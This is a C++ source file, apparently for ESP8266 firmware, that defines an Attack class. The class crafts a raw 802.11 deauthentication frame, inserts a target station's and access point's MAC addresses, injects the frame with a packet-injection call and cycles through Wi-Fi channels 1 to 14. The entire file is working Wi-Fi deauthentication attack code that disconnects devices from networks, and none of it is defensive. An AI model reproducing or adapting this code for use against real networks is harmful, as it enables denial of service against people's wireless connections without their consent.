#pragma once

#include "Attack.h"

uint8_t Attack::wifi_channel = 0;
bool Attack::is_aggressive = false;

uint8_t Attack::deauth_frame[26] = {
            /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
            /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
            /*  4 - 9  */ 0x50, 0x8e, 0x49, 0x60, 0xd5, 0xb2, // reciever (STA)
            /* 10 - 15 */ 0x20, 0x83, 0xf8, 0x10, 0x3c, 0x94, // source (AP)
            /* 16 - 21 */ 0x20, 0x83, 0xf8, 0x10, 0x3c, 0x94, // BSSID (AP)
            /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
            /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
            };

bool Attack::sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t ch, bool force_ch) {
  setWifiChannel(ch, force_ch);
  return wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
}

void Attack::setWifiChannel(uint8_t ch, bool force) {
    if (((ch != Attack::wifi_channel) || force) && (ch < 15)) {
        Attack::wifi_channel = ch;
        wifi_set_channel(Attack::wifi_channel);
    }
}

uint8_t Attack::getWifiChannel() {
  return Attack::wifi_channel;
}

void Attack::nextChannel() {
  if (Attack::getWifiChannel() == 14)
    Attack::setWifiChannel(1, true);
  else Attack::setWifiChannel(Attack::getWifiChannel() + 1, true);
}

void Attack::deauth(byte *sta, byte *ap) {
  memcpy(&deauth_frame[4], sta, 6);
  memcpy(&deauth_frame[10], ap, 6);
  memcpy(&deauth_frame[16], ap, 6);

  if (!sendPacket(deauth_frame, 26, wifi_channel, false))
    UART::println("SEND ERROR");
}
